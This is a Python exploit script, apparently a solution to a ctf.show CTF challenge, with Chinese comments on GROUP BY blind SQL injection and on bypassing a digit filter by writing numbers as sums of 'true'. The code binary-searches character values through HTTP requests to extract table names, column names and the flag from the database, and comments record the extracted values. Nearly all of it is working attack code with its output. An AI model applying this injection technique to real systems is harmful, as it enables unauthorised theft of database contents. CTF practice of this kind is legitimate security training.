import time
import threading
import requests

'''
查询语句

       //分页查询
  $sql = select * from ctfshow_user group by $username;
返回逻辑

//TODO:很安全，不需要过滤
//用户名不能是数字
      
'''

'''
group by 注入
select * from users group by 1,if(1=1,sleep(0.05),1)
需要注意的是，是对查询结果的每一行都进行一次sleep
当前题目ID一共有21条

过滤数字，用true绕过，true想当于1，true+true相当于2，以此类推。
然后group by id 和 group by username的回显不一样，所以可以用布尔盲注，
当然也可以接着用上题的时间盲注把1改成id，数字用ture就可以了

'''

url = "http://557f0a52-1683-42f6-95c7-3206ec17c4fa.challenge.ctf.show:8080/api/"
"""
Author:feng
"""

def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
        return num


flag = ''
for i in range(1, 100):
    min = 32
    max = 128
    while 1:
        j = min+(max-min)//2
        if min == j:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break

        # payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},{}))<{},username,id)".format(createNum(i),createNum(1),createNum(j))
        # ctfshow_flagas,ctshow_user

        # payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),{},{}))<{},username,id)".format(createNum(i),createNum(1),createNum(j))
        # id,flagasabc,info

        payload = "if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),{},{}))<{},username,id)".format(createNum(i),createNum(1),createNum(j))
        # ctfshow{4696bcd3-3aac-43e1-92e0-3c0e82e5c411}

        params = {
            'u': payload
        }
        r = requests.get(url=url, params=params)
        #print(r.text)
        if len(r.text) < 300:
            max = j
        else:
            min = j




